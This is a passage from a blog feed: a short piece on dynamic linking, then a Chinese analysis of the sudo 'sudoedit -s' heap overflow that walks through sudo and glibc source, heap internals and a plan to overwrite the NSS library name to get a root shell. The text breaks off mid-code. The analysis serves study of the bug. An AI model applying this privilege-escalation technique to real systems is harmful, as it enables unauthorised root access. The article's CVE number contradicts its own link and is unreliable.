Libary）</strong>（地址不固定）</li></ul><p><strong>静态共享库</strong></p><p>静态共享库的做法是将程序的各个模块统一交给操作系统进行管理，操作系统在<strong>某个特定的地址</strong>划分出一些地址块，为那些已知的模块预留足够的空间。因为这个地址对于不同的应用程序来说，都是固定的，所以称之为<strong>静态</strong>。</p><p>但是静态共享库的目标地址会导致地址冲突、升级等问题。</p><p><strong>动态共享库</strong></p><p>采用动态共享库的方式，也称为<strong>装载时重定位（Load Time Relocation）</strong>。其基本思路是：<strong>在链接时，对所有绝对地址的引用都不作重定位，而把这一步推迟到装载时再完成。一旦模块装载地址确定，即目标地址确定，那么系统就对程序中所有的绝对地址引用进行重定位。</strong></p><p>但是这种方式也存在一些问题。比如，动态链接模块被装载映射至虚拟空间后，指令部分是在多个进程间共享的，由于装载时重定位的方法需要修改指令，所以没有办法做到同一份指令被多个进程共享，因为指令被重定位后对于每个进程来说都是不同的。</p><p>然后，动态链接库中的代码是共享的，但是其中的可修改数据部分对于不同进程来说是由多个副本的。基于此，一种名为<strong>地址无关代码</strong>的技术被提出以克服这个问题。</p><p><strong>与地址无关</strong></p><p>无论何种操作系统上，使用动态链接生成的目标文件中凡是涉及第三方库的函数调用都是<strong>地址无关</strong>的。我们自己编写的程序名为hello.c，hello.c中调用了C标准库的<code>printf()</code>，在生成的目标文件中，不会立即确定<code>printf()</code>的具体地址，而是在运行时去装载这个函数，在装载阶段确定<code>printf()</code>的地址。这里提到的地址指的是进程在内存上的虚拟地址。动态链接库的函数地址在编译时是不确定的，在装载时，装载器根据当前地址空间情况，动态地分配一块虚拟地址空间。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在会写一个C程序，也要了解一个C代码是如何从ASCII文件一步步变为可执行文件的过程。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux下Hello-World的前生今世&quot;&gt;&lt;a href=&quot;#Linux下Hello-World的前生今世&quot; class=&quot;headerlink&quot; title=&quot;Linux下Hello World的前生今世&quot;&gt;&lt;/a&gt;Linux下Hello World的前生</summary>
      
    
    
    
    <category term="linux" scheme="http://example.com/categories/linux/"/>
    
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
    <category term="编译过程" scheme="http://example.com/tags/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"/>
    
    <category term="链接" scheme="http://example.com/tags/%E9%93%BE%E6%8E%A5/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-25646堆溢出漏洞复现及分析</title>
    <link href="http://example.com/2021/04/10/CVE-2021-3156/"/>
    <id>http://example.com/2021/04/10/CVE-2021-3156/</id>
    <published>2021-04-10T03:26:10.677Z</published>
    <updated>2021-04-10T06:32:38.500Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-25646堆溢出漏洞复现及分析"><a href="#CVE-2021-25646堆溢出漏洞复现及分析" class="headerlink" title="CVE-2021-25646堆溢出漏洞复现及分析"></a>CVE-2021-25646堆溢出漏洞复现及分析</h1><h4 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><p>​        当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。</p><p>​    影响范围：</p><p>​    Sudo 1.8.2 - 1.8.31p2</p><p>​    Sudo 1.9.0 - 1.9.5p1</p><h4 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h4><p>​    对于bash而言假如我们希望执行某个命令可以使用<code>bash -c [command]</code>来执行，如果我们希望以root的权限去执行某个命令的话可以直接<code>sudo [cmd]</code>，而如果我们希望以<code>shell</code>模式去执行某个命令的时候，可以使用<code>sudo -i</code>或者<code>sudo -s</code>参数，在参数说明里我们可以看到<code>-i, --login run login shell as the target user; a command may also be specified， -s, --shell run shell as the target user; a command may also be specified</code>，当我们使用上述参数时对于sudo的flags而言有两种情况：</p><ol><li><p>使用<code>sudo -s</code>，设置<code>MO    DE_SHELL</code></p></li><li><p>使用<code>sudo -i</code>，设置<code>MODE_SHELL|MODE_LOGIN_SHELL</code></p><p>​    在<code>src/parse_args.c</code>里我们可以看到对于这种模式的参数处理，处理方式为将参数按照空格拼接起来，对于一些元字符使用反斜线进行转义处理，最终覆写了argv为ac这个指针数组。</p></li></ol><p>​    源码分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     * For shell mode we need to rewrite argv</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;</span><br><span class="line"><span class="keyword">char</span> **av, *cmnd = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> ac = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* shell -c &quot;command&quot; */</span></span><br><span class="line">    <span class="keyword">char</span> *src, *dst;</span><br><span class="line">        <span class="comment">//得到命令的长度</span></span><br><span class="line">    <span class="keyword">size_t</span> cmnd_size = (<span class="keyword">size_t</span>) (argv[argc - <span class="number">1</span>] - argv[<span class="number">0</span>]) +</span><br><span class="line"><span class="built_in">strlen</span>(argv[argc - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    cmnd = dst = reallocarray(<span class="literal">NULL</span>, cmnd_size, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (cmnd == <span class="literal">NULL</span>)</span><br><span class="line">sudo_fatalx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (!gc_add(GC_PTR, cmnd))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//拼接命令并且处理转移符</span></span><br><span class="line">    <span class="keyword">for</span> (av = argv; *av != <span class="literal">NULL</span>; av++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (src = *av; *src != <span class="string">&#x27;\0&#x27;</span>; src++) &#123;</span><br><span class="line">                <span class="comment">/* quote potential meta characters */</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">isalnum</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)*src) &amp;&amp; *src != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;-&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">                    *dst++ = <span class="string">&#x27;\\&#x27;</span>;<span class="comment">//处理转义字符，&#x27;\\&#x27;表示反斜线</span></span><br><span class="line">                *dst++ = *src;</span><br><span class="line">            &#125;</span><br><span class="line">*dst++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cmnd != dst)</span><br><span class="line">    dst--;  <span class="comment">/* replace last space with a NUL */</span></span><br><span class="line">    *dst = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    ac += <span class="number">2</span>; <span class="comment">/* -c cmnd */</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//上述处理完毕后结果保存在dst指针指向的内存</span></span><br><span class="line">av = reallocarray(<span class="literal">NULL</span>, ac + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line">    <span class="comment">//分配新的内存保存拼接的命令</span></span><br><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">    sudo_fatalx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (!gc_add(GC_PTR, av))</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">av[<span class="number">0</span>] = (<span class="keyword">char</span> *)user_details.shell; <span class="comment">/* plugin may override shell */</span></span><br><span class="line"><span class="keyword">if</span> (cmnd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    av[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">    av[<span class="number">2</span>] = cmnd;</span><br><span class="line">&#125;</span><br><span class="line">av[ac] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//最后的形式为 shell -c cmnd(shell和环境变量相关，比如我这里是zsh，shell为/usr/bin/zsh)</span></span><br><span class="line">    <span class="comment">//最终用av覆写argv</span></span><br><span class="line">argv = av;</span><br><span class="line">argc = ac;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        随后在<code>sudoers.c</code>中的<code>sudoers_policy_main</code>函数中调用<code>set_cmnd</code>将命令行参数存放在一个堆上的数据结构<code>user_args</code>中，这里也对元字符做了处理，假如不是<code>\\</code>+<code>space</code>的形式就跳过元字符，否则拷贝到<code>*to</code>。那么假如我们的命令行参数以<code>\\</code>结尾，那么<code>from[0]=&#39;\\&#39;;from[1]=NULL(注意NULL并非sapce范围)</code>，此时from++指向空字符，下面将空字符拷贝到了<code>*to</code>并且<code>from++</code>后执行了NULL后面的字符，此时再次进行while循环判断时很明显这里是可以继续进入循环的(如果后一个字符不为NULL)，从而赋值得以继续进行，从而产生了溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When running a command via a shell, the sudo front-end</span></span><br><span class="line"><span class="comment"> * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class="line"><span class="comment"> * for sudoers matching and logging purposes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line"><span class="keyword">while</span> (*from) &#123;</span><br><span class="line"><span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">from++;</span><br><span class="line">*to++ = *from++;</span><br><span class="line">&#125;</span><br><span class="line">*to++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">*--to = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>set_cmnd()存在越界写，溢出user_args堆缓冲区（size是在852-853行中计算）。根本原因就是，sudo默认 \ 后面肯定跟着元字符，实际上后面只有1个结束符。</strong></p><p>当<code>from</code>指向<code>\</code>时，from[1]指向NULL字节，from[2]指向的就是环境变量的第一个字节了，执行<code>*too=*from++</code>，可以将后面的NULL字节拷贝到<code>user_args</code>的堆中，且让<code>from++</code>，从而避开了<code>while(*from）</code>判断是否读到NULL字节的检测，由于参数后面紧跟环境变量的值，因此通过<strong>设置环境变量的值来覆盖user_args堆后面的数据</strong>。</p><p>​    上述是我们的理论分析，在理论角度上看漏洞是存在的，但是我们在之前的漏洞中也见到过由于无法创造漏洞利用场景(比如我想提权但是exp里需要某个root用户给的capability)，这样的洞就非常鸡肋。那么在我们的分析里有几个理想条件，那么最后的这个场景，即反斜线作为cmd-line的最后一个字符从理论上来说是无法实现的，这里要求我们有<code>MODE_SHELL|MODE_LOGIN_SHELL</code>，而假如flag包含<code>MODE_SHELL</code>的话在我们之前的<code>parse_args</code>参数解析中就会将所有元字符给转义掉，也就是说会有两个反斜线，我们再按照代码走一遍会发现这样循环末尾的<code>*from=NULL</code>，因此会跳出循环。</p><p>​    再仔细对比一下二者的条件，二者的条件略有不同。我们的问题在于能否设置flag为<code>MODE_SHELL</code>以及<code>MODE_RUN</code>或者<code>MODE_EDIT</code>或者<code>MODE_CHECK</code>。</p><p>​    再看下解析参数的部分会发现好像还是不太行，假如我们使用<code>-e</code>参数设置<code>MODE_EDIT</code>或者使用<code>-l</code>参数设置<code>MODE_CHECK</code>，我们的<code>MODE_SHELL</code>参数就会被从<code>valid_flags</code>去掉。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bug condition</span></span><br><span class="line"><span class="keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; </span><br><span class="line">            <span class="comment">//... </span></span><br><span class="line">           <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; </span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//escape meta char condition</span></span><br><span class="line"><span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;</span><br><span class="line">    <span class="comment">//.. </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODE_NONINTERACTIVE0x00800000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODE_SHELL0x00020000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//parse_args.c</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> (mode &amp;&amp; mode != MODE_EDIT)</span><br><span class="line">usage_excl(<span class="number">1</span>);</span><br><span class="line">    mode = MODE_EDIT;</span><br><span class="line">    sudo_settings[ARG_SUDOEDIT].value = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    valid_flags = MODE_NONINTERACTIVE;<span class="comment">//这里</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> (mode) &#123;</span><br><span class="line"><span class="keyword">if</span> (mode == MODE_LIST)</span><br><span class="line">    SET(flags, MODE_LONG_LIST);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    usage_excl(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mode = MODE_LIST;</span><br><span class="line">    valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;<span class="comment">//这里</span></span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; valid_flags) != flags)</span><br><span class="line">usage(<span class="number">1</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    最后作者发现了一个可以利用的地方(盲猜是通过全局搜flag找到的)，那就是如果我们去执行sudoedit，<code>parse_args</code>函数会自动设置<code>MODE_EDIT</code>，并且不会重置<code>valid_flags</code>，而<code>valid_flags</code>默认包含了<code>MODE_SHELL</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Default flags allowed when running a command.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_VALID_FLAGS(MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> valid_flags = DEFAULT_VALID_FLAGS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First, check to see if we were invoked as &quot;sudoedit&quot;. */</span></span><br><span class="line">    proglen = <span class="built_in">strlen</span>(progname);</span><br><span class="line">    <span class="keyword">if</span> (proglen &gt; <span class="number">4</span> &amp;&amp; <span class="built_in">strcmp</span>(progname + proglen - <span class="number">4</span>, <span class="string">&quot;edit&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">progname = <span class="string">&quot;sudoedit&quot;</span>;</span><br><span class="line">mode = MODE_EDIT;</span><br><span class="line">sudo_settings[ARG_SUDOEDIT].value = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    也就是说，加入我们执行<code>sudoedit -s</code>，就同时兼具了<code>MODE_SHELL|MODE_EDIT</code>而没有<code>MODE_RUN</code>，因此可以成功到达漏洞点。</p><p>一个溢出demo：</p><p><img src="https://i.loli.net/2021/04/10/w1pmGBidMAHYjhu.png" alt="溢出demo.png"></p><h5 id="1-堆溢出分析"><a href="#1-堆溢出分析" class="headerlink" title="1.堆溢出分析"></a>1.堆溢出分析</h5><p>1.堆在内存中的位置</p><p><img src="https://i.loli.net/2021/04/10/Q7CPNX43tiMVxWp.png" alt="堆的位置分布.png"></p><h5 id="2-堆的结构"><a href="#2-堆的结构" class="headerlink" title="2.堆的结构"></a>2.堆的结构</h5><p><img src="https://i.loli.net/2021/04/10/6938X7Ay4h2qOlR.png" alt="堆区结构.png"></p><p>arena：通过sbrk或mmap系统调用为线程分配的堆区，按线程的类型可以分为2类：</p><pre><code>main arena：主线程建立的arena；thread arena：子线程建立的arena；</code></pre><p>bin：一个用以保存Free chunk链表的表头信息的指针数组，按所悬挂链表的类型可以分为4类:</p><pre><code>Fast bin：Fast bin 共有10个，存储了chunk size 从16到80的free chunk，这些free chunk被称作fast chunkUnsorted bin：当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。Small bin：小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。Large bin：大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。</code></pre><p><img src="https://i.loli.net/2021/04/10/6XPgJO3GtnYodEf.png" alt="bins分类.png"></p><p><img src="https://i.loli.net/2021/04/10/oXgKMUD1Lc67Ybz.png" alt="fast_bin.png"></p><p><strong>PS:libc2.26 之后的 Tcache 机制</strong></p><p>Tcache bin :类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找。</p><p>区别：<strong>Max fast bins size is 0x80. Max tcache bins size is 0x410</strong></p><p><img src="https://i.loli.net/2021/04/10/heQiJqHdXUj9krF.png" alt="多线程共享堆区.png"></p><p>mutex：互斥锁，防止多线程对chunk资源的竞争</p><p><img src="https://i.loli.net/2021/04/10/odku3e8Mgavx4bB.png" alt="直观结构.png"></p><p>Large bin：</p><p><img src="https://i.loli.net/2021/04/10/eLkBGIz7Ah5E1gO.png" alt="largebin.png"></p><p>chunk：逻辑上划分的一小块内存，根据作用不同分为4类：</p><pre><code>Allocated chunk：即分配给用户且未释放的内存块；Free chunk：即用户已经释放的内存块；Top chunk：处于一个arena的最顶部的chunkLast Remainder chunk：对small bin的malloc机制的介绍中当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk。</code></pre><p>标志位：</p><p>A:记录当前chunk是否属于主线程</p><p>M:记录当前chunk是否是由mmap分配</p><p>P:记录前一个chunk块是否被分配</p><p><img src="https://i.loli.net/2021/04/10/VXnM5lwBWHrhxIe.png" alt="chunk结构.png"></p><p><strong>Malloc Algorithm：</strong></p><p><strong>1.若malloc请求大小与tcache中某个chunk大小完全匹配，优先从tcache bins调用而不必向large bin发出请求。</strong></p><p>2.若请求内存足够大，则调用mmap()直接向操作系统从内存中调用</p><p>3.若fast bin中有合适大小的块，则先从中分配</p><p>TO  be continued….</p><p><strong>Free Algorithm：</strong></p><p><strong>1.若tcache bins有空间，则优先将空闲块放入其中</strong></p><p>2.如果块足够小，则优先放入fast bins中</p><p>TO  be continued….</p><p>从该调度算法可以看出，某个具体大小的chunk可以在tcache bins 中稳定存在一定时间并且不发生合并，这个机制可以为我们精准溢出到某个结构体前面附近提前进行占位。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>思路：利用溢出覆写<code>nss_library</code>为<code>X/X</code>，从而加载自定义的库函数，进而get root shell。</p><p>知识背景：</p><h5 id="1-glibc-setlocale"><a href="#1-glibc-setlocale" class="headerlink" title="1.glibc setlocale"></a>1.glibc setlocale</h5><p><strong>main()函数较早调用了setlocale()函数，查阅源码我们发现此处进行了malloc操作，这样可以分配并释放几个LC环境变量（LC_CTYPE，LC_MESSAGES，LC_TIME等），这样就在Sudo的堆开头处留下了空闲的fast/tcache chunks</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /src/sudo.c</span></span><br><span class="line"><span class="number">150</span>:    <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], <span class="keyword">char</span> *envp[])</span></span></span><br><span class="line"><span class="function">151:    </span>&#123;</span><br><span class="line">        ...</span><br><span class="line"><span class="number">171</span>:    setlocale(LC_ALL, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        ...</span><br><span class="line"><span class="number">216</span>:    sudo_mode = parse_args(argc, argv, &amp;submit_optind, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/10/ZYQbr8e5tGUBqs9.png" alt="setlocale.png"></p><p><img src="https://i.loli.net/2021/04/10/5GCNfYP38zbSrFk.png" alt="setlocaleA.png"></p><p><strong>总之我们可以通过设置环境变量对堆进行修饰，得到指定大小的空闲chunk 并且该块在NSS结构体之前。由malloc机制不难分析出，我们控制好溢出大小很容易在tcache或者fast bins中占有该空闲块。</strong></p><h5 id="2-NSS（Name-Service-Switch）"><a href="#2-NSS（Name-Service-Switch）" class="headerlink" title="2.NSS（Name Service Switch）"></a>2.NSS（Name Service Switch）</h5><p>​    每个Linux/Unix的操作系统中都有这样的一套称之为NSS的共享库来做一些解析，比如登录用户的用户名以及IP地址到域名的解析。比如对于DNS服务来说，它默认查看<code>/etc/resolv.conf</code>配置文件的内容进行解析，对于用户和组来说，它会默认查看<code>/etc/passwd</code>和<code>/etc/group</code>。其配置文件位于<code>/etc/nsswitch.conf</code>，其每行都规定了查找方法的规范，在GNU C Library里, <strong>每个可用的SERVICE都必须有文件 <code>/lib/libnss_SERVICE.so.1</code> 与之对应。****</strong>也就是说，GNU将每个服务实现为不同的module(shared library)，因此可以在Linux系统中找到下列相应的共享库。**</p><blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. service_user 结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">/* And the link to the next entry.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">service_user</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/* Action according to result.  */</span></span><br><span class="line">lookup_actions actions[<span class="number">5</span>];</span><br><span class="line"><span class="comment">/* Link to the underlying library object.  */</span></span><br><span class="line">service_library *library;</span><br><span class="line"><span class="comment">/* Collection of known functions.  */</span></span><br><span class="line"><span class="keyword">void</span> *known;</span><br><span class="line"><span class="comment">/* Name of the service (`files&#x27;, `dns&#x27;, `nis&#x27;, ...).  */</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">0</span>];</span><br><span class="line">&#125; service_user;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. nss_load_library() 函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nss_load_library</span> <span class="params">(service_user *ni)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">static</span> name_database default_table;</span><br><span class="line">   ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,   <span class="comment">// （1）设置 ni-&gt;library</span></span><br><span class="line">                  ni-&gt;name);</span><br><span class="line">   <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="comment">/* Load the shared library.  */</span></span><br><span class="line">   <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line">              + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line">      <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line">      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,   <span class="comment">// （2）伪造的库文件名必须是 libnss_xxx.so</span></span><br><span class="line">                          <span class="string">&quot;libnss_&quot;</span>),</span><br><span class="line">                    ni-&gt;name),</span><br><span class="line">              <span class="string">&quot;.so&quot;</span>),</span><br><span class="line">        